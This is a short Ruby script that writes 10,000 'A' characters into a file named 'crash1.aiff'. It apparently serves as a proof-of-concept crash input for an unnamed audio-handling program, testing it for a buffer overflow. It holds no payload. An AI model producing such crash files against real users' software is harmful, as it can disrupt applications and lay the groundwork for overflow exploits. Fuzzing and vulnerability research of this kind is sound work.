File.open "crash1.aiff" , "w" do |file|
 
buffer = "A" * 10000
 
file.puts buffer
end

